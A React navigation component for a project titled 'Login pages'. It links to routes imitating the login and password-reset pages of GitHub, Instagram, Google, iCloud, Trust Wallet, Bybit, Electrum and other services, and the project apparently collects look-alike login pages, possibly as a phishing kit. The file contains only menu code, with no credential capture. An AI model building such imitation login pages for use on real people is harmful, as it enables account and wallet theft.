import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Link, useLocation } from 'react-router-dom';

const Navbar = () => {
  const [isOpen, setIsOpen] = useState(false);
  const gitRoutes = ['/github', '/forgot-password-github']
  const instaRoutes = ['/instagram', '/forgot-password-instagram']
  const shopifyRoutes = ['/shopify', '/shopify-login']
  const appleRoutes = ['/icloud', '/icloud-forgot-password']




  const toggleNavbar = () => {
    setIsOpen(!isOpen);
  };
  const location = useLocation();
  const gitActive = gitRoutes.includes(location.pathname);
  const instaActive = instaRoutes.includes(location.pathname);
  const shopifyActive = shopifyRoutes.includes(location.pathname);
  const appleActive = appleRoutes.includes(location.pathname);




  return (
    <motion.nav className="bg-[rgb(255,255,255)] p-2 w-full"
     initial={{y: -100, opacity: 0.32}}
    animate={{ y: 0, opacity: 1,}}
    transition={{ease: 'easeOut',type: 'string', stiffness: 500,duration:0.5}}>
      <div className="container mx-auto flex justify-between items-center">

      <Link to='/'>
        <div className="text-white text-lg font-bold"><h1 className='text-lg dancing-script-topic inline text-black'>Login pages</h1> <span className='text-3xl green'>.</span></div>
        </Link>
        <div className="lg:hidden">
          <button
            onClick={toggleNavbar}
            className="text-black focus:outline-none"
          >
            <svg
              className="w-6 h-6"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d={isOpen ? "M6 18L18 6M6 6l12 12" : "M4 6h16M4 12h16m-7 6h7"}
              ></path>
            </svg>
          </button>
        </div>
        <div
          className={`fixed inset-y-0 right-0 bg-[rgb(255,255,255)] p-4 transform ${
            isOpen ? 'translate-x-0 z-50' : 'translate-x-full'
          } transition-transform duration-300 ease-in-out lg:transform-none lg:relative lg:flex lg:items-center lg:w-auto w-full lg:space-x-6`}
        >
          <div className="flex justify-between items-center">
            <div className="lg:hidden">
              <button
                onClick={toggleNavbar}
                className="text-black focus:outline-none"
              >
                <svg
                  className="w-6 h-6"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M6 18L18 6M6 6l12 12"
                  ></path>
                </svg>
              </button>
            </div>
          </div>
          <ul className="lg:flex lg:space-x-1 text-black text-center lg:text-left">
            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px] mb-3 md:mb-4 lg:mb-0'>
            <Link
      to="/"
      className={`block py-2 px-4 links relative margarine-regular`}
    >
      Home
      <span
        className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/' ? 'w-full' : 'hover:w-full w-0'}`}
      ></span>
    </Link>
            </li>
            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px] mb-3 md:mb-4 lg:mb-0'>
            <Link
      to="/github"
      className={`block py-2 px-4 links relative margarine-regular`}
    >
      Github
      <span
        className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${gitActive ? 'w-full' : 'hover:w-full w-0'}`}
      ></span>
    </Link>
            </li>
            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px] mb-3 md:mb-4 lg:mb-0'>
              <Link to="/instagram" className={`block py-2 px-4 links relative margarine-regular`}>Instagram
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${instaActive ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>
            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/snapchat" className={`block py-2 px-4 links relative margarine-regular`}>Snapchat
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/snapchat' ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>
            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/google" className={`block py-2 px-4 links relative margarine-regular`}>Google
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/google' ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>

            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/pinterest" className={`block py-2 px-4 links relative margarine-regular`}>Pinterest
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/pinterest' ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>

            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/messenger" className={`block py-2 px-4 links relative margarine-regular`}>Messenger
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/messenger' ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>
            

            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/electrum" className={`block py-2 px-4 links relative margarine-regular`}>Electrum
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/electrum' ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>

         

            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/shopify" className={`block py-2 px-4 links relative margarine-regular`}>Shopify
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${shopifyActive ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>

            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/icloud" className={`block py-2 px-4 links relative margarine-regular`}>AppleID
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${appleActive ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>


          
            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/trust-wallet" className={`block py-2 px-4 links relative margarine-regular`}>Trust Wallet
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/trust-wallet' ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>

            <li className='flex flex-col items-center justify-center gap-1 text-2xl md:text-2xl lg:text-[14px]'>
              <Link to="/bybit" className={`block py-2 px-4 links relative margarine-regular`}>Bybit
                <span className={`absolute bottom-0 left-0 h-1 bg-black transition-all duration-300 ${location.pathname === '/bybit' ? 'w-full' : 'hover:w-full w-0'}`}></span>
              </Link>
            </li>
          </ul>
        </div>
      </div>
    </motion.nav>
  );
};

export default Navbar;
